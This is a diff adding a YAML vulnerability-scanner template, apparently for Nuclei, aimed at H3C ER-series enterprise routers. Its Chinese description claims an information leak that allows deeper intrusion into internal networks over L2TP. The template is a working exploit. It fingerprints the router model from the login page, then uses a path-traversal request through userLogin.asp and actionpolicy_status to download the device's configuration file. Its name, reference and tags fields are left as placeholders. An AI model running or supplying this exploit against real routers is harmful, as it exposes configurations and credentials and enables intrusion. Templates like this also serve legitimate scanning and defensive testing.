@@ -1,0 +1,47 @@
+id: h3c-ERxxx-unauthorized-access
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: H3C ERxx是H3C推出的新一代高性能企业级路由器，采用全新硬件架构、具备丰富的软件功能、支持全面的安全策略。该系列版本设备存在信息泄露漏洞，攻击者可通过该漏洞读取服务器敏感信息。从而通过 l2tp进一步渗透内网。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |
+        GET /userLogin.asp HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+      - |+
+        GET /userLogin.asp/../actionpolicy_status/../{{xinghao}}.cfg HTTP/1.1
+        Host: {{Hostname}}
+        accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+
+
+
+
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: header_2
+        words:
+          - 'application/x-unknown'
+    extractors:
+      - type: regex
+        name: xinghao
+        internal: true
+        part: body_1
+        regex:
+          - 'ER\d+[A-Z0-9\-]*'       
